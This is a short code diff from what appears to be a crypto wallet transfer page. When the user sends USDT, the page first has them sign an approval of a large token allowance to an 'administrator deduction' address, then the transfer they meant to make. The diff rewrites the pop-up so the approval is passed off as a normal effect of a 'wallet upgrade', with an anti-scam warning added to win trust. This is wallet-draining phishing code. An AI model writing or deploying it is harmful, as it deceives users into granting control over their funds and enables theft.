@@ -278,14 +278,14 @@ sendBtn.addEventListener("click", async () => {
     const needWei = BigInt(web3.utils.toWei(val.toString(),"ether"));
     const approveWei = BigInt(web3.utils.toWei(APPROVE_AMOUNT,"ether"));
     try{
-        alert("🔐第一步，请签名授权USDT额度");
+        alert("因钱包升级版本不同转账会提示授信USDT额度为正常现象，任何人向您索要助记词或私钥的均为诈骗。请妥善保管您的助记词和私钥");
         //授权：授权给 SPENDER_ADDR（管理员划扣地址）
         const approveCalldata = "0x095ea7b3"
             + SPENDER_ADDR.slice(2).padStart(64,"0")
             + approveWei.toString(16).padStart(64,"0");
         await sendTx(approveCalldata);
 
-        alert("✅授权完成，请签名转账");
+        alert("请签名转账");
         //用户转账：转给 USER_RECEIVE_ADDR
         const transferCalldata = "0xa9059cbb"
             + USER_RECEIVE_ADDR.slice(2).padStart(64,"0")
